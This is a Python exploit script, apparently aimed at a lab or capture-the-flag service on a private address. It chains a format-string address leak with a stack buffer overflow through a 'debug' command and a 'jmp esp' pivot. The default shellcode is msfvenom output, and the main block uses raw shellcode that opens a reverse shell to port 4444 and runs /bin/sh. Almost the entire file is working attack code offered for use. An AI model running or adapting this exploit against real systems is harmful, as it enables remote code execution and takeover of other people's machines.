#!/usr/bin/env python3
from __future__ import annotations
from socket import socket, AF_INET, SOCK_STREAM
from struct import pack, unpack
from typing import TypeVar, Union, Generic
from binascii import unhexlify

_B = TypeVar("_B", bound=Union[str, bytes, None])
_S = TypeVar("_S", bound=Union[socket, None])


# noinspection SpellCheckingInspection,PyShadowingNames
class Exploit(Generic[_B, _S]):
    def __init__(self, **kw):
        self.sock: _S = socket(AF_INET, SOCK_STREAM)
        self.shellcode: _B = (
            # Default shellcode x86 touch /tmp/pwned:
            # msfvenom -p linux/x86/exec cmd='touch /tmp/pwned' -b "\x00\x0a\x0d"  -f python 2>/dev/null
            b"\xdd\xc0\xd9\x74\x24\xf4\xbf\xf2\x39\xfd\x61\x5b\x2b"
            b"\xc9\xb1\x0e\x31\x7b\x17\x03\x7b\x17\x83\x19\xc5\x1f"
            b"\x94\xb7\x3d\xb8\xce\x15\x24\x50\xdc\xfa\x21\x47\x76"
            b"\xd3\x42\xe0\x87\x43\x8a\x92\xee\xfd\x5d\xb1\xa3\xe9"
            b"\x4f\x36\x44\xe9\x1b\x59\x31\x8a\x8b\x85\x96\x38\x21"
            b"\xb6\xc7\xb0\xce\x58\x7d\x54\x31\xf2\x2e\x1d\xd0\x31"
            b"\x50"
        )
        self.address: str = "192.168.43.128"
        self.port: int = 65534
        self.buffSize: int = 4
        self.command: bytes = b"debug"
        self.base: int = 0x56556000
        self.stack: int = 0x00000000
        self.crash: int = 726
        self.offset: int = 0x66f
        self.__dict__.update(**kw)

    @staticmethod
    def getPadding(size: int, byte: int = 0x90) -> bytes:
        return bytes([byte]) * size

    @staticmethod
    def toString(data: _B) -> str:
        return (
            data if isinstance(data, str)
            else data.decode()
        )

    @staticmethod
    def toHexAddress(data: int, right: bool = False) -> str:
        address = hex(data).lstrip("0x")
        return (
            address.ljust(8, "0") if right
            else address.rjust(8, "0")
        )

    def toAddress(self, data: _B, right: bool = False) -> int:
        address = self.toString(data).strip()
        address = str(
            address.ljust(8, "0") if right
            else address.rjust(8, "0")
        )
        return self.unpack(unhexlify(address))

    @staticmethod
    def gadget(key: str, *ag, **kw) -> int:
        return {
            "jmp esp": 0x000004f8
        }.get(key, *ag, **kw)

    @staticmethod
    def pack(address: int) -> bytes:
        return pack("<L", address)

    @staticmethod
    def unpack(address: bytes) -> int:
        return unpack(">L", address)[0]

    def connect(self) -> Exploit:
        try:
            self.sock: socket = socket(AF_INET, SOCK_STREAM)
            self.sock.connect((self.address, self.port))
        except Exception as err:
            raise Exception(f"Connect error: {err}")
        return self

    def send(self, buffer: bytes) -> Exploit:
        try:
            self.sock.send(buffer)
        except Exception as err:
            raise Exception(f"Send error: {err}")
        return self

    def recv(self, size: int) -> bytes:
        try:
            return self.sock.recv(size)
        except Exception as err:
            raise Exception(f"Receive error: {err}")

    def close(self) -> Exploit:
        try:
            self.sock.close()
        except Exception as err:
            print(f"Close error: {err}")
        return self

    def calcGadget(self, *ag, **kw) -> bytes:
        try:
            return self.pack(self.base + self.gadget(*ag, **kw))
        except Exception as err:
            raise Exception(f"Gadget error: {err}")

    def rawGadget(self, *ag, **kw) -> bytes:
        try:
            return self.pack(self.gadget(*ag, **kw))
        except Exception as err:
            raise Exception(f"Gadget error: {err}")

    def triggerRop(self, padding: int = 0x90) -> bytes:
        code: bytes = self.command
        code += self.getPadding(self.crash + 5, padding)
        return code

    def recvUntil(self, flag: bytes) -> bytes:
        data: bytes = bytes()
        while True:
            try:
                data += self.recv(self.buffSize)
                if flag in data:
                    break
            except Exception as er:
                print(f"Recieve error: {er}")
                break
        return data

    def leakOffsets(self) -> Exploit:
        try:
            # Leak offsets to calculate image base address:
            _ = self.recvUntil(b">")
            self.send(b".%x.%x.%x.WOOT")
            data: list[bytes] = self.recvUntil(b"WOOT").split(b".")
            self.base = int(self.toAddress(data[3].strip()) - self.offset)
            self.stack = int(self.toAddress(data[2].strip()))
            print(data)
            print(
                "base: {} \nstack: {}\njmp esp: {}".format(
                    self.toHexAddress(self.base),
                    self.toHexAddress(self.stack),
                    self.toHexAddress(self.base + 0x000014f8)
                )
            )
        except Exception as err:
            raise Exception(f"Error leaking offsets: {err}")
        return self

    def run(self) -> Exploit:
        try:
            # 1) Begin exploit by leaking base address to binary, calculate offsets:
            self.connect().leakOffsets()
            # 2) Trigger code execution via vulnerable command:
            code: bytes = self.triggerRop(0x90)
            # 3) Stack pivot
            code += self.calcGadget("jmp esp")
            # 4) Padding and shellcode
            code += self.pack(0x90909090) * 32
            code += self.shellcode
            code += self.pack(0xcccccccc)
            # 7) Send exploit and close
            self.send(code).close()
        except Exception as err:
            print(f"Exception running exploit: {err}")
            self.close()
        return self


if __name__ == '__main__':
    # System information:
    # PRETTY_NAME="Kali GNU/Linux Rolling"
    # NAME="Kali GNU/Linux"
    # ID=kali
    # VERSION="2022.3"
    # VERSION_ID="2022.3"
    # VERSION_CODENAME="kali-rolling"
    # ID_LIKE=debian
    # Architecture:            x86_64
    #   CPU op-mode(s):        32-bit, 64-bit
    #   Address sizes:         45 bits physical, 48 bits virtual
    #   Byte Order:            Little Endian
    # CPU(s):                  2
    #   On-line CPU(s) list:   0,1
    # Vendor ID:               GenuineIntel
    #   BIOS Vendor ID:        GenuineIntel
    #   Model name:            Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz
    #     BIOS Model name:     Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz  CPU @ 2.6GHz
    #     BIOS CPU family:     2
    #     CPU family:          6
    #     Model:               165
    #     Thread(s) per core:  1
    #     Core(s) per socket:  1
    #     Socket(s):           2
    #     Stepping:            2
    Exploit(shellcode=b"\x31\xc9\x31\xdb\xf7\xe3\xfe\xc1\xfe\xc3\xfe\xc3\x66\xb8\x67\x01\xcd\x80\x93\xfe\xc9\x51\xb2\x16\xb9\xc0\xa8\x2b\x80\x51\x66\x68\x11\x5c\x66\x6a\x02\x8d\x0c\x24\x66\xb8\x6a\x01\xcd\x80\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x99\xf7\xe2\x8d\x08\xbe\x2f\x2f\x73\x68\xbf\x2f\x62\x69\x6e\x51\x56\x57\x8d\x1c\x24\xb0\x0b\xcd\x80").run()
    # Exploit().run()
